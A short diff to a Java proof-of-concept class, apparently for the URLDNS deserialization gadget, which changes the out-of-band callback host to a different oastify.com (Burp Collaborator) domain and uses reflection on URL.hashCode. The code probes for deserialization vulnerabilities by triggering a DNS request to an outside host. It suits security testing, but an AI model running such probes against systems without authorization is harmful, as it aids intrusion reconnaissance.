@@ -9,7 +9,7 @@ public class URLDNSEXP {
     public static void main(String[] args) throws Exception{
         HashMap<URL,Integer> hashmap= new HashMap<URL,Integer>();
         // 这里不要发起请求
-        URL url = new URL("http://8oxpkyud88s5adzxg6lq7uj3gumka9.oastify.com");
+        URL url = new URL("http://2lovopw6370ldlc2nr68vnr8kzqqef.oastify.com");
 //        Class c = url.getClass();
         Field hashcodeFile = Class.forName("java.net.URL").getDeclaredField("hashCode");
         hashcodeFile.setAccessible(true);
